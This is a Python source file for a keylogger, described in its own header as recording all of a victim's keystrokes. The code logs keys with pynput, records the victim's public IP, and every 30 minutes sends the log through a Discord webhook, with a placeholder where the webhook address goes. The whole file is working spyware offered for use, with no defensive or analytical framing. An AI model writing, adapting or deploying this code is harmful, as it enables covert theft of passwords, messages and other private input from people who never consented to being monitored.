#                  ===== PYTHON KEYLOGGER ===== 
#              once started continously send every 30 minutes
#              all the keystrokes of the victim through a discord 
#              webhook, if the machine is not connected to the internet
#              will save all the keystrokes and send it as soon connection
#              is back

from pynput import keyboard
import logging
import requests
import time
from dhooks import Webhook
from datetime import datetime
import urllib3

#discord_webhook = [ADD_HERE_WEBHOOK]

logging.basicConfig(filename="keyLog.txt", level=logging.DEBUG, format='%(message)s')


urllib3.disable_warnings()
urllib3.logger = logging.getLogger('urllib3')
urllib3.logger.setLevel(logging.CRITICAL)

log_send = Webhook('discord_webhook')

line = ""
caps_lock = False
shift_act = False
internet_status = True

def on_press(key):
    global line
    global caps_lock
    global shift_act

    if key == keyboard.Key.enter:
        logging.info(line)
        line = ""
    elif key == keyboard.Key.caps_lock:
        caps_lock = not caps_lock ###
    elif key == keyboard.Key.space:
        line += ' '
    elif key not in [keyboard.Key.shift_l, keyboard.Key.shift_r, keyboard.Key.shift]:
        char = str(key).strip("'").upper() if caps_lock or shift_act else str(key).strip("'").lower()
        line += char if char else str(key)


def send_it_away(cont):
    timestmp = datetime.now()
    ip = requests.get("https://api.ipify.org/?format=text")
    ipstmp = ip.text.strip()
    cont_stmp = f"[{ipstmp}]\n[{timestmp}]\n\n{cont}"

    chunks = [cont_stmp[i:i+2000] for i in range(0, len(cont_stmp), 2000)]

    for chunk in chunks:
        response=log_send.send(chunk)
        if response is not None and response.status_code != 204:
            global internet_status
            internet_status = False









listener = keyboard.Listener(on_press=on_press)
listener.start()


log_send.send("HEY IM ON THE MACHINE AND IM STARTING TO RECORD")

while True:

    time.sleep(1800)


    with open('keyLog.txt','r') as file:
        lines = file.readlines()
        cont = ''.join(lines)

        if cont.strip() and internet_status:
            send_it_away(cont)
            with open('keyLog.txt','w') as file:
                file.write('')
        elif not internet_status:
            pass
        else:
            send_it_away("INACTIVE")


    try:
        with requests.get("https://www.google.com") as response:
            if response.status_code == 200 and response is not None:
                for chunk in response.iter_content(chunk_size=1024):
                    pass
                internet_status = True

    except (requests.ConnectionError, AttributeError):
        internet_status = False
